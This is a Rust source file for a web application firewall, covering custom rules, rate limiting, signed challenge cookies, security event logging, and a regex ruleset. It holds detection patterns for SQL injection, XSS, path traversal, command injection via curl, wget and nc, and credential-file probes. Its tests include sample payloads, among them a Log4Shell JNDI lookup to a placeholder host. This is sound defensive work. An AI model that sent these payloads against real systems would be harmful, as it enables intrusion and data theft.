//! Web application firewall: custom rules, rate limiting, a managed ruleset
//! for common attacks, a JavaScript challenge and the security event log.

use crate::expr::{url_decode, ReqInfo};
use crate::store::ZoneSnap;
use regex::Regex;
use ring::hmac;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, VecDeque};
use std::net::IpAddr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{LazyLock, Mutex};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

const MAX_EVENTS: usize = 5000;
/// Events a replica holds for the primary while it cannot be reached.
const MAX_OUTBOX: usize = 2000;
pub const CLEARANCE_SECS: u64 = 1800;
/// An origin that keeps failing is logged once per this many seconds (per zone, host and status).
const ORIGIN_ERROR_EVERY: u64 = 60;
pub const CLEARANCE_COOKIE: &str = "fucf_clearance";

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Event {
    pub ray_id: String,
    pub occurred_at: String,
    pub zone_id: String,
    /// `firewall`, `ratelimit`, `managed` or `security_level`.
    pub source: String,
    pub rule_id: String,
    pub description: String,
    pub action: String,
    pub client_ip: String,
    /// ISO country code of the client, empty when unknown.
    #[serde(default)]
    pub country: String,
    /// Edge node that handled the request; empty for this node itself.
    #[serde(default)]
    pub node: String,
    pub host: String,
    pub method: String,
    pub uri: String,
    pub user_agent: String,
}

/// What the edge should do with a request.
#[derive(Debug, PartialEq)]
pub enum Verdict {
    Pass,
    Block { rule_id: String },
    RateLimited { retry_after: u64 },
    /// The human check (see `super::challenge`); `click`: it always asks for a click.
    Challenge { click: bool },
}

// ------------------------------------------------------ managed rules ----

#[derive(Clone, Copy, PartialEq)]
enum Target {
    /// Raw and URL-decoded path + query.
    Uri,
    /// Uri plus request body.
    Args,
    UserAgent,
    /// Args plus every header value.
    Everything,
}

struct Managed {
    id: &'static str,
    description: &'static str,
    target: Target,
    re: Regex,
}

static MANAGED: LazyLock<Vec<Managed>> = LazyLock::new(|| {
    let rule = |id, description, target, pattern: &str| Managed {
        id,
        description,
        target,
        re: Regex::new(&format!("(?i){pattern}")).expect("managed rule regex"),
    };
    vec![
        rule(
            "100001",
            "SQL injection",
            Target::Args,
            r"(\bunion\b[\s\S]{0,40}\bselect\b|\bselect\b[\s\S]{1,100}\bfrom\b[\s\S]{1,60}(information_schema|pg_catalog|sysobjects|mysql\.user)|'\s*(or|and)\s*'?\d+'?\s*=\s*'?\d+|\b(sleep|benchmark|pg_sleep)\s*\(\s*\d|\bwaitfor\s+delay\b|;\s*(drop|alter|truncate)\s+(table|database)\b|\bor\s+1\s*=\s*1\b|'\s*;?\s*--(\s|$))",
        ),
        rule(
            "100002",
            "Cross-site scripting",
            Target::Args,
            r"(<script\b|<\s*/\s*script\s*>|javascript:\s*\S|\bon(error|load|click|mouseover|focus|toggle)\s*=\s*\S|<iframe\b|<svg\b[^>]*\bon\w+\s*=|<img\b[^>]*\bon\w+\s*=)",
        ),
        rule(
            "100003",
            "Path traversal / file inclusion",
            Target::Args,
            r"(\.\./|\.\.\\|/etc/(passwd|shadow|hosts)\b|/proc/self/|\bc:\\windows\\|\b(php|file|expect|phar|zip)://)",
        ),
        rule(
            "100004",
            "Command injection",
            Target::Args,
            r"([;|`]\s*(cat|ls|id|whoami|uname|wget|curl|nc|ncat|bash|sh|python\d?|perl|powershell)\b(\s|$|[;|`/-])|&&\s*(cat|ls|id|whoami|uname|wget|curl|nc|bash|sh)\b|\$\(\s*(cat|ls|id|whoami|uname|wget|curl|bash|sh)\b|/bin/(ba)?sh\b|\bcmd\.exe\b)",
        ),
        rule(
            "100005",
            "Sensitive file probe",
            Target::Uri,
            r"(/\.env(\.[\w-]+)?($|\?)|/\.git/|/\.svn/|/\.hg/|/\.aws/|/\.ssh/|/wp-config\.php|/id_rsa\b|/\.htpasswd|/\.DS_Store|/web\.config($|\?)|\.(bak|sql|swp)($|\?))",
        ),
        rule(
            "100006",
            "Vulnerability scanner",
            Target::UserAgent,
            r"(sqlmap|nikto|nessus|acunetix|masscan|zgrab|nuclei|dirbuster|gobuster|wpscan|havij|openvas|w3af)",
        ),
        rule("100007", "Log4Shell / JNDI injection", Target::Everything, r"\$\{\s*(jndi\s*:|\$\{|(lower|upper|env|sys|date)\s*:)"),
    ]
});

/// First managed rule matching the request, as `(id, description)`.
pub fn managed_match(info: &ReqInfo, body: Option<&[u8]>) -> Option<(&'static str, &'static str)> {
    let uri = info.uri();
    let decoded = url_decode(&uri);
    let twice = url_decode(&decoded);
    let body_text = body.map(String::from_utf8_lossy);
    let body_decoded = body_text.as_deref().map(url_decode);
    let ua = info.header("user-agent");

    MANAGED
        .iter()
        .find(|m| {
            let hit = |s: &str| m.re.is_match(s);
            let in_uri = || hit(&uri) || hit(&decoded) || (twice != decoded && hit(&twice));
            let in_body = || body_text.as_deref().is_some_and(hit) || body_decoded.as_deref().is_some_and(hit);
            match m.target {
                Target::Uri => in_uri(),
                Target::Args => in_uri() || in_body(),
                Target::UserAgent => hit(ua),
                Target::Everything => in_uri() || in_body() || info.headers.iter().any(|(_, v)| hit(v)),
            }
        })
        .map(|m| (m.id, m.description))
}

// ---------------------------------------------------------------- waf ----

struct Counter {
    window_start: Instant,
    count: u32,
    blocked_until: Option<Instant>,
}

#[derive(Default)]
struct Journal {
    events: VecDeque<Event>,
    /// Logged here and not yet handed to the primary (replicas only).
    outbox: VecDeque<Event>,
    dirty: bool,
}

pub struct Waf {
    journal: Mutex<Journal>,
    /// This node reports its outbox to peers.
    reporting: AtomicBool,
    /// `accelerate` mode: keep only the outbox, skipping 5,000-event journal in RAM.
    outbox_only: AtomicBool,
    counters: Mutex<HashMap<(String, IpAddr), Counter>>,
    /// When an origin error was last logged, per (zone, host, status).
    origin_logged: Mutex<HashMap<(String, String, u16), u64>>,
    key: hmac::Key,
}

fn unix_now() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

impl Waf {
    /// A WAF whose challenge clearances are only valid for this process.
    #[cfg(test)]
    pub fn new() -> Self {
        let rng = ring::rand::SystemRandom::new();
        Waf::with_key(hmac::Key::generate(hmac::HMAC_SHA256, &rng).expect("system RNG"))
    }

    /// A WAF whose challenge clearances are derived from `secret`: every node
    /// started with the same secret accepts them, and they survive restarts.
    pub fn with_secret(secret: &[u8]) -> Self {
        let derived = hmac::sign(&hmac::Key::new(hmac::HMAC_SHA256, b"fucf challenge clearance"), secret);
        Waf::with_key(hmac::Key::new(hmac::HMAC_SHA256, derived.as_ref()))
    }

    fn with_key(key: hmac::Key) -> Self {
        Waf {
            journal: Mutex::default(),
            reporting: AtomicBool::new(false),
            outbox_only: AtomicBool::new(false),
            counters: Mutex::default(),
            origin_logged: Mutex::default(),
            key,
        }
    }

    pub fn set_outbox_only(&self) {
        self.outbox_only.store(true, Ordering::Relaxed);
        self.reporting.store(true, Ordering::Relaxed);
    }

    /// Newest first.
    pub fn events(&self, zone_id: &str, limit: usize) -> Vec<Event> {
        let journal = self.journal.lock().unwrap();
        let mut out: Vec<&Event> = journal.events.iter().filter(|e| e.zone_id == zone_id).collect();
        // events of other nodes arrive in batches: order by time, not by arrival
        out.sort_by(|a, b| b.occurred_at.cmp(&a.occurred_at));
        out.into_iter().take(limit).cloned().collect()
    }

    /// Start keeping an outbox of what is logged, for [`Waf::take_outbox`].
    pub fn set_reporting(&self) {
        self.reporting.store(true, Ordering::Relaxed);
    }

    /// Events logged since the last call, for delivery to the primary.
    pub fn take_outbox(&self) -> Vec<Event> {
        std::mem::take(&mut self.journal.lock().unwrap().outbox).into()
    }

    /// Primary side: add the events `node` logged.
    pub fn absorb(&self, node: &str, events: Vec<Event>) {
        if events.is_empty() {
            return;
        }
        let mut journal = self.journal.lock().unwrap();
        for mut event in events {
            event.node = node.to_string();
            journal.events.push_back(event);
        }
        let excess = journal.events.len().saturating_sub(MAX_EVENTS);
        journal.events.drain(..excess);
        journal.dirty = true;
    }

    /// Read back the events saved by [`Waf::save`].
    pub fn load(&self, path: &std::path::Path) {
        let Ok(bytes) = std::fs::read(path) else { return };
        match serde_json::from_slice::<VecDeque<Event>>(&bytes) {
            Ok(events) => self.journal.lock().unwrap().events = events,
            Err(e) => tracing::warn!("ignoring unreadable security event file {}: {e}", path.display()),
        }
    }

    /// Write the event log to `path` if it changed since the last save.
    /// Serialization and disk I/O run outside `journal: Mutex`.
    pub fn save(&self, path: &std::path::Path) -> std::io::Result<()> {
        if self.outbox_only.load(Ordering::Relaxed) {
            return Ok(());
        }
        let events = {
            let mut journal = self.journal.lock().unwrap();
            if !journal.dirty {
                return Ok(());
            }
            journal.dirty = false;
            journal.events.clone()
        };
        let bytes = serde_json::to_vec(&events).map_err(std::io::Error::other)?;
        let tmp = path.with_extension("json.tmp");
        if let Err(e) = std::fs::write(&tmp, bytes).and_then(|_| std::fs::rename(&tmp, path)) {
            self.journal.lock().unwrap().dirty = true;
            return Err(e);
        }
        Ok(())
    }

    fn log(&self, zone: &ZoneSnap, info: &ReqInfo, ray: &str, source: &'static str, rule: (&str, &str), action: &str) {
        let event = Event {
            ray_id: ray.to_string(),
            occurred_at: crate::store::now(),
            zone_id: zone.zone.id.clone(),
            source: source.to_string(),
            rule_id: rule.0.to_string(),
            description: rule.1.to_string(),
            action: action.to_string(),
            client_ip: info.ip.map(|i| i.to_string()).unwrap_or_default(),
            country: info.country.clone(),
            node: String::new(),
            host: info.host.clone(),
            method: info.method.clone(),
            uri: info.uri().chars().take(2048).collect(),
            user_agent: info.header("user-agent").chars().take(512).collect(),
        };
        self.record(event);
    }

    /// The origin of a site could not be reached (source `origin`). The
    /// description says what kind of failure it was and, where known, how to
    /// fix it: this is for the dashboard, visitors only see the kind. A
    /// failing origin is logged at most once a minute per host and status.
    #[allow(clippy::too_many_arguments)]
    pub fn origin_error(
        &self,
        zone_id: &str,
        ray: &str,
        status: u16,
        reason: super::Reason,
        hint: Option<&str>,
        host: &str,
        line: &str,
        ip: IpAddr,
        country: &str,
    ) {
        let now = unix_now();
        {
            let mut logged = self.origin_logged.lock().unwrap();
            if logged.len() > 10_000 {
                logged.retain(|_, at| now < *at + ORIGIN_ERROR_EVERY);
            }
            let key = (zone_id.to_string(), host.to_string(), status);
            if logged.get(&key).is_some_and(|at| now < at + ORIGIN_ERROR_EVERY) {
                return;
            }
            logged.insert(key, now);
        }
        // `line` is "<version> <method> <uri>"
        let mut parts = line.splitn(3, ' ').skip(1);
        let (method, uri) = (parts.next().unwrap_or_default(), parts.next().unwrap_or_default());
        let description = match hint {
            Some(hint) => format!("{}：{hint}", reason.zh),
            None => reason.zh.to_string(),
        };
        self.record(Event {
            ray_id: ray.to_string(),
            occurred_at: crate::store::now(),
            zone_id: zone_id.to_string(),
            source: "origin".to_string(),
            rule_id: status.to_string(),
            description,
            action: "origin_error".to_string(),
            client_ip: ip.to_string(),
            country: country.to_string(),
            node: String::new(),
            host: host.to_string(),
            method: method.to_string(),
            uri: uri.chars().take(2048).collect(),
            user_agent: String::new(),
        });
    }

    fn record(&self, event: Event) {
        let mut journal = self.journal.lock().unwrap();
        if self.reporting.load(Ordering::Relaxed) {
            if journal.outbox.len() >= MAX_OUTBOX {
                journal.outbox.pop_front();
            }
            journal.outbox.push_back(event.clone());
        }
        if !self.outbox_only.load(Ordering::Relaxed) {
            if journal.events.len() >= MAX_EVENTS {
                journal.events.pop_front();
            }
            journal.events.push_back(event);
            journal.dirty = true;
        }
    }

    // ---- challenge clearance: `<expiry>.<hmac(zone|ip|expiry)>` ----

    fn sign(&self, zone_id: &str, ip: IpAddr, expiry: u64) -> String {
        hex(hmac::sign(&self.key, format!("{zone_id}|{ip}|{expiry}").as_bytes()).as_ref())
    }

    /// A MAC of `data` under the fleet's secret, hex.
    pub fn mac(&self, data: &str) -> String {
        hex(hmac::sign(&self.key, data.as_bytes()).as_ref())
    }

    /// Whether `mac_hex` is [`Waf::mac`] of `data`.
    pub fn mac_ok(&self, data: &str, mac_hex: &str) -> bool {
        let bytes: Option<Vec<u8>> = (0..mac_hex.len() / 2).map(|i| mac_hex.get(i * 2..i * 2 + 2).and_then(|h| u8::from_str_radix(h, 16).ok())).collect();
        mac_hex.len() == 64 && bytes.is_some_and(|m| hmac::verify(&self.key, data.as_bytes(), &m).is_ok())
    }

    pub fn clearance_token(&self, zone_id: &str, ip: IpAddr) -> String {
        let expiry = unix_now() + CLEARANCE_SECS;
        format!("{expiry}.{}", self.sign(zone_id, ip, expiry))
    }

    fn has_clearance(&self, zone_id: &str, info: &ReqInfo) -> bool {
        let Some(ip) = info.ip else { return false };
        info.header("cookie")
            .split(';')
            .filter_map(|c| c.trim().strip_prefix(CLEARANCE_COOKIE)?.strip_prefix('='))
            .any(|token| {
                let Some((expiry, mac)) = token.split_once('.') else { return false };
                let Ok(expiry) = expiry.parse::<u64>() else { return false };
                let mac_bytes: Option<Vec<u8>> = (0..mac.len() / 2)
                    .map(|i| mac.get(i * 2..i * 2 + 2).and_then(|h| u8::from_str_radix(h, 16).ok()))
                    .collect();
                expiry > unix_now()
                    && mac_bytes
                        .is_some_and(|m| hmac::verify(&self.key, format!("{zone_id}|{ip}|{expiry}").as_bytes(), &m).is_ok())
            })
    }

    // ---- rate limiting (fixed window per rule and client IP) ----

    /// Count one request; `Some(retry_after_secs)` when over the limit.
    fn count(&self, rule_id: &str, ip: IpAddr, threshold: u32, period: u32, timeout: u32) -> Option<u64> {
        let now = Instant::now();
        let period = Duration::from_secs(period as u64);
        let mut counters = self.counters.lock().unwrap();
        if counters.len() > 100_000 {
            counters.retain(|_, c| c.blocked_until.is_some_and(|b| b > now) || now - c.window_start < period);
            if counters.len() > 100_000 {
                // bound memory even under a distributed IP flood within the active window
                counters.retain(|_, c| c.blocked_until.is_some_and(|b| b > now));
                if counters.len() > 100_000 {
                    counters.clear();
                }
            }
        }
        let c = counters
            .entry((rule_id.to_string(), ip))
            .or_insert(Counter { window_start: now, count: 0, blocked_until: None });
        if let Some(until) = c.blocked_until {
            if until > now {
                return Some((until - now).as_secs().max(1));
            }
            *c = Counter { window_start: now, count: 0, blocked_until: None };
        }
        if now - c.window_start >= period {
            c.window_start = now;
            c.count = 0;
        }
        c.count += 1;
        if c.count <= threshold {
            return None;
        }
        let window_end = c.window_start + period;
        let until = if timeout > 0 { now + Duration::from_secs(timeout as u64) } else { window_end };
        c.blocked_until = Some(until);
        Some((until - now).as_secs().max(1))
    }

    /// Run all security phases for one request.
    pub fn check(&self, zone: &ZoneSnap, info: &ReqInfo, body: Option<&[u8]>, ray: &str) -> Verdict {
        // 1. custom firewall rules
        for (rule, expr) in &zone.firewall {
            if !expr.matches(info) {
                continue;
            }
            let ident = (rule.meta.id.as_str(), rule.description.as_str());
            match rule.action.as_str() {
                "skip" => {
                    self.log(zone, info, ray, "firewall", ident, "skip");
                    return Verdict::Pass;
                }
                "log" => self.log(zone, info, ray, "firewall", ident, "log"),
                "js_challenge" | "managed_challenge" => {
                    if !self.has_clearance(&zone.zone.id, info) {
                        self.log(zone, info, ray, "firewall", ident, &rule.action);
                        if info.ip.is_none() {
                            return Verdict::Block { rule_id: rule.meta.id.clone() };
                        }
                        return Verdict::Challenge { click: rule.action == "managed_challenge" };
                    }
                }
                _ => {
                    self.log(zone, info, ray, "firewall", ident, "block");
                    return Verdict::Block { rule_id: rule.meta.id.clone() };
                }
            }
        }

        // 2. under attack: nobody gets further without having passed the challenge
        if zone.zone.settings.security_level == "under_attack" && !self.has_clearance(&zone.zone.id, info) {
            self.log(zone, info, ray, "security_level", ("under_attack", "Under attack mode"), "js_challenge");
            return match info.ip {
                Some(_) => Verdict::Challenge { click: false },
                None => Verdict::Block { rule_id: "under_attack".into() },
            };
        }

        // 3. rate limits
        if let Some(ip) = info.ip {
            for (rule, expr) in &zone.rate_limits {
                if !expr.matches(info) {
                    continue;
                }
                if let Some(retry_after) =
                    self.count(&rule.meta.id, ip, rule.threshold, rule.period, rule.mitigation_timeout)
                {
                    let ident = (rule.meta.id.as_str(), rule.description.as_str());
                    self.log(zone, info, ray, "ratelimit", ident, &rule.action);
                    if rule.action == "block" {
                        return Verdict::RateLimited { retry_after };
                    }
                }
            }
        }

        // 4. managed ruleset
        let mode = zone.zone.settings.waf.as_str();
        if mode != "off" {
            if let Some(hit) = managed_match(info, body) {
                self.log(zone, info, ray, "managed", hit, mode);
                if mode == "block" {
                    return Verdict::Block { rule_id: hit.0.to_string() };
                }
            }
        }
        Verdict::Pass
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn info(uri: &str) -> ReqInfo {
        let (path, query) = uri.split_once('?').unwrap_or((uri, ""));
        ReqInfo {
            ip: Some("198.51.100.7".parse().unwrap()),
            method: "GET".into(),
            host: "example.com".into(),
            path: path.into(),
            query: query.into(),
            headers: vec![("user-agent".into(), "Mozilla/5.0".into())],
            ..Default::default()
        }
    }

    #[test]
    fn managed_rules_catch_attacks() {
        let hit = |uri: &str| managed_match(&info(uri), None).map(|m| m.0);
        assert_eq!(hit("/item?id=1%20UNION%20SELECT%20password%20FROM%20users"), Some("100001"));
        assert_eq!(hit("/item?id=1'+or+'1'='1"), Some("100001"));
        assert_eq!(hit("/login?user=admin'--"), Some("100001"));
        assert_eq!(hit("/s?q=%3Cscript%3Ealert(1)%3C/script%3E"), Some("100002"));
        assert_eq!(hit("/s?q=%253Cscript%253E"), Some("100002")); // double encoded
        assert_eq!(hit("/s?q=<img src=x onerror=alert(1)>"), Some("100002"));
        assert_eq!(hit("/download?file=../../../../etc/passwd"), Some("100003"));
        assert_eq!(hit("/download?file=..%2f..%2fsecret"), Some("100003"));
        assert_eq!(hit("/ping?host=8.8.8.8;cat+/etc/hostname"), Some("100004"));
        assert_eq!(hit("/.env"), Some("100005"));
        assert_eq!(hit("/.git/config"), Some("100005"));
        assert_eq!(hit("/backup.sql"), Some("100005"));
        assert_eq!(hit("/?x=${jndi:ldap://evil/a}"), Some("100007"));

        let mut scanner = info("/");
        scanner.headers = vec![("user-agent".into(), "sqlmap/1.7".into())];
        assert_eq!(managed_match(&scanner, None).map(|m| m.0), Some("100006"));
        let mut hdr = info("/");
        hdr.headers.push(("x-api-version".into(), "${jndi:ldap://evil/a}".into()));
        assert_eq!(managed_match(&hdr, None).map(|m| m.0), Some("100007"));
        let body = b"comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E";
        assert_eq!(managed_match(&info("/post"), Some(body)).map(|m| m.0), Some("100002"));
    }

    #[test]
    fn managed_rules_allow_normal_traffic() {
        for uri in [
            "/",
            "/products?category=shoes&sort=price&id=42",
            "/search?q=select+a+union+card+from+the+list",
            "/blog/2024/how-to-drop-a-table-in-sql",
            "/article?title=Tom+%26+Jerry&id=7&order=asc",
            "/api/v1/users/123/orders?limit=10&offset=20",
            "/static/js/app.min.js?v=1.2.3",
            "/docs/environment.html",
            "/path/with.dots/file.name.txt",
            "/q?expr=1%2B1%3D2&note=it's+fine",
            "/callback?redirect=https://example.com/home",
        ] {
            assert_eq!(managed_match(&info(uri), None).map(|m| m.0), None, "{uri}");
        }
        let json = br#"{"name":"O'Brien","bio":"I select the best options from a list; or so I think."}"#;
        assert_eq!(managed_match(&info("/api"), Some(json)).map(|m| m.0), None);
    }

    #[test]
    fn rate_limit_window() {
        let waf = Waf::new();
        let ip: IpAddr = "198.51.100.7".parse().unwrap();
        for _ in 0..3 {
            assert_eq!(waf.count("r", ip, 3, 60, 0), None);
        }
        assert!(waf.count("r", ip, 3, 60, 0).is_some());
        assert!(waf.count("r", ip, 3, 60, 0).is_some());
        // other clients and other rules are unaffected
        assert_eq!(waf.count("r", "198.51.100.8".parse().unwrap(), 3, 60, 0), None);
        assert_eq!(waf.count("r2", ip, 3, 60, 0), None);
    }

    #[test]
    fn clearance_tokens() {
        let waf = Waf::new();
        let mut req = info("/");
        let token = waf.clearance_token("zone-a", req.ip.unwrap());
        assert!(!waf.has_clearance("zone-a", &req));
        req.headers.push(("cookie".into(), format!("a=b; {CLEARANCE_COOKIE}={token}")));
        assert!(waf.has_clearance("zone-a", &req));
        // bound to the zone, the client IP, and tamper-proof
        assert!(!waf.has_clearance("zone-b", &req));
        req.ip = Some("198.51.100.99".parse().unwrap());
        assert!(!waf.has_clearance("zone-a", &req));
        let mut forged = info("/");
        forged.headers.push(("cookie".into(), format!("{CLEARANCE_COOKIE}=99999999999.{}", "ab".repeat(32))));
        assert!(!waf.has_clearance("zone-a", &forged));

        // nodes started with the same secret accept each other's clearances
        let (a, b, c) = (Waf::with_secret(b"fleet"), Waf::with_secret(b"fleet"), Waf::with_secret(b"other"));
        let mut req = info("/");
        req.headers.push(("cookie".into(), format!("{CLEARANCE_COOKIE}={}", a.clearance_token("z", req.ip.unwrap()))));
        assert!(a.has_clearance("z", &req) && b.has_clearance("z", &req) && !c.has_clearance("z", &req));
    }

    #[test]
    fn events_travel_to_the_primary_and_survive_restarts() {
        let store = crate::store::testutil::temp_store();
        let zone = store.create_zone("example.com").unwrap().id;
        let snap = store.snapshot();
        let zs = snap.find_zone("example.com").unwrap();
        let (primary, replica) = (Waf::new(), Waf::new());
        replica.set_reporting();

        replica.log(zs, &info("/.env"), "ray1", "managed", ("100005", "Sensitive file probe"), "block");
        std::thread::sleep(Duration::from_millis(2));
        primary.log(zs, &info("/admin"), "ray2", "firewall", ("r1", "no admin"), "block");
        assert!(primary.take_outbox().is_empty(), "only replicas keep an outbox");
        let batch = replica.take_outbox();
        assert!(batch.len() == 1 && replica.take_outbox().is_empty());
        // what travels is plain JSON
        let batch: Vec<Event> = serde_json::from_str(&serde_json::to_string(&batch).unwrap()).unwrap();
        primary.absorb("eu", batch);

        let seen = primary.events(&zone, 10);
        assert_eq!(seen.iter().map(|e| (e.ray_id.as_str(), e.node.as_str())).collect::<Vec<_>>(), [("ray2", ""), ("ray1", "eu")]);
        assert_eq!(replica.events(&zone, 10).len(), 1, "the replica keeps its own view");

        let path = std::env::temp_dir().join(format!("fucf-events-{}.json", uuid::Uuid::new_v4().simple()));
        primary.save(&path).unwrap();
        let restarted = Waf::new();
        restarted.load(&path);
        assert_eq!(restarted.events(&zone, 10).len(), 2);
        std::fs::remove_file(&path).unwrap();
        primary.save(&path).unwrap();
        assert!(!path.exists(), "nothing changed, nothing written");
    }
}
